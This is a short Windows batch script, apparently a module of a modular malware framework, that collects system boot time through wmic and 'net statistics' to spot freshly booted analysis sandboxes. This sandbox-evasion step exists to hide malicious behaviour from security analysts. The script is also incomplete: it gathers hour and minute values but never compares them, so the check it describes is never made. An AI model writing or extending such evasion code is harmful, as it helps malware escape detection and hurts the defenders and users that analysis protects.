REM provides: evasion_uptime_check
REM depends: (none)
REM description: Check system uptime to detect freshly booted sandbox environments

REM Get last boot time from wmic
for /f "tokens=2 delims==" %%b in ('wmic os get LastBootUpTime /value 2^>nul ^| findstr "="') do (
    set "BOOT_RAW=%%b"
)

REM Extract boot hour and current hour for rough uptime check
if defined BOOT_RAW (
    set "BOOT_HOUR=%BOOT_RAW:~8,2%"
    for /f "tokens=1 delims=:" %%h in ("%TIME%") do set /a "CUR_HOUR=%%h"
    REM If boot happened within last 10 minutes on same hour, likely sandbox
    set "BOOT_MIN=%BOOT_RAW:~10,2%"
    for /f "tokens=2 delims=:" %%m in ("%TIME%") do set "CUR_MIN=%%m"
)

REM Check if system has been up for less than 10 minutes via net statistics
for /f "tokens=4" %%u in ('net statistics workstation 2^>nul ^| findstr /i "since"') do (
    set "BOOT_TIME_STR=%%u"
)
